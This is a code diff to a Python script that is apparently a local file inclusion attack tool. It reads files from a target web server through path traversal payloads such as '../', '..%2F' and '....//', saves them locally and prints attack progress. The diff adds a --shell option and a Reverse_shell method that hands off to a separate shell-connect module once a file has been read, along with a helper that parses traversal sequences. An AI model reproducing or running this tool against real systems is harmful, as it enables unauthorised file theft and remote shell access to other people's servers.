@@ -1,4 +1,3 @@
-
 #!/usr/bin/env python
 import urllib.response
 import time
@@ -196,6 +195,7 @@ class Read_File:
                            print("[+] Connection          : ................ | "+rex2[7])
                            print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
                            self.store_file()
+                           
                            print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
                            print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                            print("[+] Full Path           : ................ | : "+self.LFI.replace('\n',''))
@@ -206,20 +206,26 @@ class Read_File:
                            else:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                                +self.args.read.replace(self.args.read[0],'_'+self.args.read[0]).replace('/','_'))
-                           exit()
+                           if self.args.shell:
+                               self.Reverse_shell()
+                           else:
+                                exit()    
                     elif not self.args.auth and len(self.Get_Oregnal_URL) != len(first_req):
-                          self.store_file()  
-                          print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
-                          print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
-                          print("[+] Full  URL           : ................ | : "+ self.LFI.replace('\n',''))
-                          print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
-                          if '/' in self.args.read:
+                           self.store_file()  
+                           print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
+                           print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
+                           print("[+] Full  URL           : ................ | : "+ self.LFI.replace('\n',''))
+                           print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
+                           if '/' in self.args.read:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                                +self.args.read.replace('/','',1).replace('/','_'))  
-                          else:
+                           else:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                                +self.args.read.replace(self.args.read[0],'_'+self.args.read[0]).replace('/','_'))              
-                          exit()
+                           if self.args.shell:
+                               self.Reverse_shell()
+                           else:
+                                exit()    
                 print('\n'+'='*20+"\n[*] RESUITE-INFO "+'\n'+'='*30+'\n')
                 print("[*] No Data found")
                 print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
@@ -244,6 +250,7 @@ class Read_File:
            parser.add_argument("-P  ","--password"    , action=None                            ,help ="use specific Passowrd")   
            parser.add_argument("-LU  ","--loginurl"   , action=None                            ,help ="use specific Passowrd") 
            parser.add_argument("-U  ","--user"        , action=None                            ,help ="use specific username ")
+           parser.add_argument( "-S", "--shell"       , action=None                            )
            self.args = parser.parse_args()     
            if len(sys.argv)!=1 :
               pass
@@ -362,6 +369,25 @@ class Read_File:
                 if os.path.exists('./FileStore/'+self.ip_re.group()+'/index.txt'):
                    os.remove('./FileStore/'+self.ip_re.group()+'/index.txt')  
                    os.remove('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'))
+     def Reverse_shell(self):
+                 if not self.args.shell:
+                    exit()
+                 else:   
+                   try:
+                 #   path   =  "python " +str(os.getcwd())+'/Package/shell/ssh.py'
+                  #   os.system(path)
+                     from Package.LFT_Shell_connect import Shell_conncet
+                     Shell_conncet.__init__(self)                     
+                   except KeyboardInterrupt :
+                      exit()
+     def file_name (self):
+           removel  = ['..%2F','../','....//','file:///']
+           self.url_remove = self.url.replace('http://','').replace('https://','')
+           for i in removel :
+                 if i in self.url_remove :
+                    join = ";".join(self.url_remove.split(i[-1]))
+                    split_list = join.split(';')
+                    self.args.read= str("/".join((split_list[-3],split_list[-2],split_list[-1]))).replace('%2','/').replace('//','/').replace('\n','')            
    except Exception  as a :
         print(a)                                       
 if __name__=='__main__':
